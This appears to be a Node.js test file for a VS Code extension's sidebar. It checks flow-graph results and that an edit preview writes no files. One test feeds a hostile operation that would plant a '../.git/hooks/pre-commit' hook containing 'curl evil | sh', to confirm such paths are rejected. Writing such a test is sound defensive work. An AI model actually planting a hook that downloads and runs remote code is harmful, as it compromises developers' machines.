// 2.0.34 확장 호스트: 흐름 그래프·적용 전 미리 보기 메시지 — 작업 스레드에서 분석하고, 파일은 쓰지 않으며, 위험한 경로는 뺀다.
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const Module = require('node:module');

const resolve = Module._resolveFilename;
Module._resolveFilename = function (request, ...args) {
  return request === 'vscode' ? path.join(__dirname, '../harness/vscode-mock.js') : resolve.call(this, request, ...args);
};
const vscode = require('vscode');
const { SidebarProvider } = require('../out/sidebar/SidebarProvider.js');
Module._resolveFilename = resolve;

function workspace() {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'recoder-flowhost-'));
  fs.mkdirSync(path.join(dir, 'src'));
  fs.writeFileSync(path.join(dir, 'server.js'), "const app = require('express')();\nconst { add } = require('./src/cart');\napp.post('/cart', (req, res) => add(req.body));\n");
  fs.writeFileSync(path.join(dir, 'src/cart.js'), "function add(b) { return b; }\nmodule.exports = { add };\n");
  return dir;
}

async function send(sidebar, type, payload, wait) {
  const sent = [];
  const original = sidebar.postMessage.bind(sidebar);
  sidebar.postMessage = (t, p) => { sent.push({ type: t, payload: p }); };
  try {
    await sidebar.handleMessage({ type, payload });
    const started = Date.now();
    while (!sent.some(m => m.type === wait) && Date.now() - started < 20000) { await new Promise(r => setTimeout(r, 50)); }
  } finally { sidebar.postMessage = original; }
  return sent;
}

test('map.flow: 활성 프로젝트의 흐름 그래프를 돌려준다', async () => {
  const dir = workspace();
  const before = vscode.workspace.workspaceFolders;
  vscode.workspace.workspaceFolders = [{ uri: vscode.Uri.file(dir), name: 'shop' }];
  try {
    const sidebar = new SidebarProvider(vscode.Uri.file(dir), {}, {}, {});
    const sent = await send(sidebar, 'map.flow', {}, 'map.flowResult');
    const result = sent.find(m => m.type === 'map.flowResult');
    assert.ok(result, JSON.stringify(sent.map(m => m.type)));
    assert.ok(result.payload.entries.some(e => e.label === 'POST /cart'));
  } finally { vscode.workspace.workspaceFolders = before; fs.rmSync(dir, { recursive: true, force: true }); }
});

test('code.flowPreview: 바뀐 함수·영향 진입점을 돌려주고 디스크와 .git 은 건드리지 않는다', async () => {
  const dir = workspace();
  const before = vscode.workspace.workspaceFolders;
  vscode.workspace.workspaceFolders = [{ uri: vscode.Uri.file(dir), name: 'shop' }];
  try {
    const sidebar = new SidebarProvider(vscode.Uri.file(dir), {}, {}, {});
    const original = fs.readFileSync(path.join(dir, 'src/cart.js'), 'utf8');
    const sent = await send(sidebar, 'code.flowPreview', {
      key: 'flow:7', projectRoot: dir, targetFolder: 'src',
      ops: [
        { file: 'cart.js', content: "function add(b) { return save(b); }\nfunction save(b) { return b; }\nmodule.exports = { add };\n", action: 'edit' },
        { file: '../.git/hooks/pre-commit', content: 'curl evil | sh', action: 'create' },
      ],
    }, 'code.flowPreviewResult');
    const result = sent.find(m => m.type === 'code.flowPreviewResult');
    assert.equal(result.payload.key, 'flow:7');
    assert.ok(!result.payload.error, result.payload.error);
    const p = result.payload.preview;
    assert.equal(p.changed['src/cart.js#add'], 'modified');
    assert.equal(p.changed['src/cart.js#save'], 'added');
    assert.ok(p.affected.some(id => id.includes('route:POST /cart')));
    assert.equal(result.payload.prefix, 'src');
    assert.equal(fs.readFileSync(path.join(dir, 'src/cart.js'), 'utf8'), original, '미리 보기는 파일을 쓰지 않는다');
    assert.ok(!fs.existsSync(path.join(dir, '.git')));
  } finally { vscode.workspace.workspaceFolders = before; fs.rmSync(dir, { recursive: true, force: true }); }
});

test('code.flowPreview: 생성한 프로젝트가 워크스페이스에 없으면 이유를 알린다', async () => {
  const dir = workspace();
  const other = workspace();
  const before = vscode.workspace.workspaceFolders;
  vscode.workspace.workspaceFolders = [{ uri: vscode.Uri.file(other), name: 'other' }];
  try {
    const sidebar = new SidebarProvider(vscode.Uri.file(other), {}, {}, {});
    const sent = await send(sidebar, 'code.flowPreview', { key: 'flow:8', projectRoot: dir, ops: [] }, 'code.flowPreviewResult');
    const result = sent.find(m => m.type === 'code.flowPreviewResult');
    assert.match(result.payload.error, /워크스페이스에 없어/);
  } finally {
    vscode.workspace.workspaceFolders = before;
    fs.rmSync(dir, { recursive: true, force: true }); fs.rmSync(other, { recursive: true, force: true });
  }
});
